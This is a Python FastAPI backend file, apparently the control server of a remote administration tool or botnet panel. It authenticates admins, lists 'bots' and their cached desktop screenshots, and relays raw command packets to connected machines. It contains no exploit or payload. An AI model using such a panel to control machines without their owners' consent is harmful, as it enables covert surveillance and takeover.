# backend/API/api.py

import json
import uvicorn
import asyncio
from typing import Any, Dict, List, Optional

from fastapi import FastAPI, WebSocket, Body
from fastapi.staticfiles import StaticFiles
from fastapi.responses import RedirectResponse, JSONResponse

import backend.LoggerWrapper as logger
from backend.Config import FRONTEND_PATH
from backend.Database import db_get_users, db_get_bots
from .auth_service import verify_user, get_login_by_token, generate_token
from .connection_manager import manager

# Импортируем сетевой протокол и хранилища данных
from backend.Services.network import NetworkProtocol
from backend.Services.ClientManager import active_clients, preview_cache

app: FastAPI = FastAPI()

# Монтируем статику фронтенда
app.mount("/sidebar", StaticFiles(directory=FRONTEND_PATH, html=True), name="static")

async def send_binary_to_bot(bot_id: str, packet: bytes) -> bool:
    """
    Вспомогательная функция для прямой отправки пакета боту через его TCP-сокет.
    Использует active_clients для поиска активного writer.
    """
    client_data = active_clients.get(bot_id)
    if client_data:
        try:
            # client_data — это кортеж (reader, writer) из ClientConnection
            _, writer = client_data
            if not writer.transport.is_closing():
                writer.write(packet)
                await writer.drain()
                return True
        except Exception as e:
            logger.Log.error(f"[API] Failed to send packet to bot {bot_id}: {e}")
    return False

@app.get("/")
async def root() -> RedirectResponse:
    return RedirectResponse("/sidebar/auth/auth.html")

@app.get("/verify_token")
async def verify(token: Optional[str] = None) -> Any:
    if (login := get_login_by_token(token)):
        return {"status": "ok", "login": login}
    return JSONResponse(status_code=401, content={"status": "err"})

@app.post("/login")
async def auth(data: Dict[str, Any] = Body(...)) -> Any:
    login_name = data.get("login", "")
    password_text = data.get("password", "")
    
    if (user := verify_user(login_name, password_text)):
        logger.Log.info(f"[API] User {login_name} logged in")
        return {
            "status": "ok",
            "token": generate_token(login_name),
            "role": user["role"],
            "prefix": user["prefix"]
        }
    return JSONResponse(status_code=401, content={"status": "error", "message": "Invalid credentials"})

@app.websocket("/ws")
async def websocket_endpoint(
    websocket: WebSocket, 
    token: str, 
    login: str, 
    mode: Optional[str] = None, 
    target: Optional[str] = None
) -> None:
    # 1. Проверка авторизации
    user_login = get_login_by_token(token)
    if not user_login or user_login != login:
        await websocket.accept()
        await websocket.close(code=1008)
        return

    # 2. Получение данных пользователя и подключение к менеджеру сессий
    user_data = db_get_users().get(user_login)
    if not user_data or not await manager.connect(websocket, user_login, user_data):
        return

    try:
        # 3. Первичная синхронизация списка ботов
        await sync_state(websocket, user_data)

        # 4. Режим управления конкретным ботом (Control Mode)
        if mode == "control" and target and NetworkProtocol.has_access(user_data, target):
            bot_db = db_get_bots().get(target, {"id": target})
            bot_status = "online" if target in active_clients else "offline"
            bot_db.update({"status": bot_status})
            
            # Упаковка инфо о боте (V8.0)
            packet = NetworkProtocol.pack_packet(target, "SystemInfo", "json", "none", "none", bot_db)
            await websocket.send_bytes(packet)
            
            # Отправка последнего кадра из кэша
            if target in preview_cache:
                prev_packet = NetworkProtocol.pack_packet(target, "Preview", "bin", "none", "none", preview_cache[target])
                await websocket.send_bytes(prev_packet)

        # 5. Цикл обработки команд от админа (Браузер -> Бот)
        while True:
            packet_bytes = await websocket.receive_bytes()
            
            if len(packet_bytes) >= 8:
                # Читаем ID бота из заголовка пакета V8.0
                id_len = packet_bytes[0]
                target_id = packet_bytes[8 : 8 + id_len].decode(errors="ignore").strip()
                
                # Проверка RBAC (имеет ли право этот админ управлять этим ботом)
                if NetworkProtocol.has_access(user_data, target_id):
                    await send_binary_to_bot(target_id, packet_bytes)
                        
    except Exception:
        pass # Соединение разорвано
    finally:
        manager.disconnect(websocket)

async def sync_state(websocket: WebSocket, user_data: Dict[str, Any]) -> None:
    """Синхронизация списка доступных ботов и их превью при подключении."""
    try:
        database = db_get_bots()
        visible_bots = []
        user_login = user_data.get("login", "unknown")
        
        for bot_id, bot_info in database.items():
            if NetworkProtocol.has_access(user_data, bot_id):
                bot_info["id"] = bot_id
                bot_info["status"] = "online" if bot_id in active_clients else "offline"
                visible_bots.append(bot_info)

        if visible_bots:
            # Рассылка системного списка (ID "SERVER")
            sync_packet = NetworkProtocol.pack_packet(
                "SERVER", "SystemInfo", "json", "none", "none", visible_bots
            )
            await websocket.send_bytes(sync_packet)
            logger.Log.info(f"[API] Synced {len(visible_bots)} bots to {user_login}")

        # Рассылка кэшированных кадров рабочего стола
        for bot_id, img_bytes in preview_cache.items():
            if NetworkProtocol.has_access(user_data, bot_id):
                await asyncio.sleep(0.01) # Анти-флуд буфера
                p_packet = NetworkProtocol.pack_packet(bot_id, "Preview", "bin", "none", "none", img_bytes)
                await websocket.send_bytes(p_packet)
                
    except Exception as e:
        logger.Log.error(f"[API] Sync State Error: {e}")

async def run_fastapi_server(host: str, port: int) -> None:
    """Запуск сервера Uvicorn."""
    config = uvicorn.Config(
        app, host=host, port=port, log_config=None,
        ws_ping_interval=20, ws_ping_timeout=20
    )
    server = uvicorn.Server(config)
    await server.serve()